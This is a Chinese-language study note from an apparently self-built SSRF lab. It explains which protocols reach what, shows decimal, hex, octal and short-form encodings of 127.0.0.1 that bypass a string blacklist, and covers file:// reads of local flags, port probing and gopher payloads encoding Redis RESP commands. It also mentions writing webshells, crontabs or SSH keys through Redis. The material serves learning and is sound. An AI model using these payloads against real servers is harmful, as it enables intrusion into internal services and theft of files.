## 二、知识点

### 1. SSRF 的三个条件（缺一不可）

```
① 有发请求的功能      file_get_contents / curl_exec / fsockopen
② URL 可控            参数、请求头、Cookie、文件内容
③ 校验缺失或可绕
```

判断任何一个点能不能打，就按这三条问。

### 2. 协议决定「射程」

| 协议 | 能到哪一层 | 能力 |
|---|---|---|
| `http://` | 应用层 | 打内网网页、后台、云元数据 |
| `file://` | 文件系统 | **读服务器本地文件**（不受 web 根限制） |
| `gopher://` | TCP 层 | **跟任意端口对话**（Redis/MySQL/FPM） |
| `dict://` | TCP 层（有限） | 探测端口、读 banner |

**这不是"权限更高"，是"换了通道"**：
- `http://` 受 web 根约束，`../` 穿不出去
- `file://` 直接读磁盘，不经过 web 服务器

### 3. 三类地址

| 类别 | 地址段 | 用途 |
|---|---|---|
| 回环 | `127.0.0.0/8` | 打本机服务（Redis、后台） |
| 私有内网 | `10/8`、`172.16/12`、`192.168/16` | 横向移动 |
| 链路本地 | `169.254.0.0/16` | **云元数据**（`169.254.169.254`） |

### 4. IP 变形的实证

黑名单检查的是**字符串**，但下面这些都解析成同一个地址：

```
127.0.0.1        原形
2130706433       十进制
0x7f000001       十六进制
0177.0.0.1       八进制
127.1            简写
[::1]            IPv6
127.0.0.1.nip.io DNS
```

**所以黑名单不可靠** —— 除非「解析成 IP 后再判断」，而且用解析出的 IP 去连接（防 DNS 重绑定）。

### 5. 端口探测的判据

盲 SSRF 下靠响应差异判断端口：

```
端口没开  → Connection refused（立刻返回，很快）
端口开着  → 200 + 内容，或协议不匹配的乱码
不存在    → 超时 / 无响应
```

### 6. Redis 与 MySQL 的难度差

| | Redis | MySQL |
|---|---|---|
| 认证 | 通常无 | **有握手**（20 字节随机 salt） |
| gopher 能否打通 | 能（单向发命令） | 难（要先收 salt 再算 response） |
| 能直接 getshell 吗 | 能（写文件） | 不能 |
| 实际用途 | 写 webshell / crontab / SSH 公钥 | **多为端口探测 + banner 抓取** |

**SSRF 打 MySQL 的性价比远低于 Redis**，报告里重点写「为什么难」比编一个「打通了」更可信。

## 三、案例 / 命令

### 1. 启动靶场（必须两个端口）

```powershell
$php='D:\phpstudy\phpstudy_pro\Extensions\php\php8.2.9nts\php.exe'
& $php -S 127.0.0.1:8090 -t 'D:\deepseek\ssrf-lab\www'        # 有漏洞的站点
& $php -S 127.0.0.1:8091 -t 'D:\deepseek\ssrf-lab\internal'   # 模拟内部服务
```

浏览器打开 `http://127.0.0.1:8090/index.php`。

### 2. 八条演示的实测结果

| # | 请求 | 结果 |
|---|---|---|
| 1 | `?url=http://127.0.0.1:8091/admin.php` | 拿到 flag，`来源 IP：127.0.0.1（校验通过）` |
| 2 | `http://127.0.0.1:8091/../secret/flag.txt` | **404**，http 出不了 web 根 |
| 3 | `?url=file:///D:/deepseek/ssrf-lab/secret/flag.txt` | **拿到 flag** |
| 4 | `mode=block` + `127.0.0.1` | 被拦截 |
| 5 | `mode=block` + `2130706433` | **绕过成功** |
| 6 | `mode=block` + `0x7f000001` | **绕过成功** |
| 7 | `mode=block` + `127.1` | **绕过成功** |
| 8 | `?url=http://127.0.0.1:6379/` | `Connection refused`（端口没开） |

### 3. gopher 发原始字节（实测）

```
发送  gopher://127.0.0.1:9001/_%2a%31%0d%0a%24%34%0d%0a%50%49%4e%47%0d%0a
收到  2a 31 0d 0a 24 34 0d 0a 50 49 4e 47 0d 0a 0d 0a
还原  *1<CR><LF>$4<CR><LF>PING<CR><LF><CR><LF>
```

这就是 Redis 的 RESP 协议。**注意末尾多一个 `\r\n`**，curl 会自动补，对 Redis 无害。

### 4. Redis 的 RESP 格式

```
*<参数个数>\r\n$<长度>\r\n<参数>\r\n...
```

`SET x hello` → `*3\r\n$3\r\nSET\r\n$1\r\nx\r\n$5\r\nhello\r\n`

## 四、踩坑

| 坑 | 现象 | 原因 / 解决 |
|---|---|---|
| 两个服务放同一端口 | 所有 http 演示都超时 | PHP 内置服务器**单线程**，index.php 用 curl 请求自己会死锁；必须分两个端口 |
| gopher 在 PHP 里用不了 | `file_get_contents('gopher://...')` 失败 | Windows 版 PHP 没有 gopher 包装器；但 `curl_exec` 走 libcurl 支持 |
| 中文路径下 file:// 可能失效 | 读取失败 | 靶场放在 ASCII 路径 `D:\deepseek\ssrf-lab\` |
| PowerShell 拼接 `"a" + $b` 传参 | 参数被拆成多个 | 必须加括号 `("a" + $b)` |
| 把 gopher 当成 SSRF 前提 | 一开始直接讲 gopher，听不懂 | gopher 只是「协议」里的一种，是工具不是前提 |
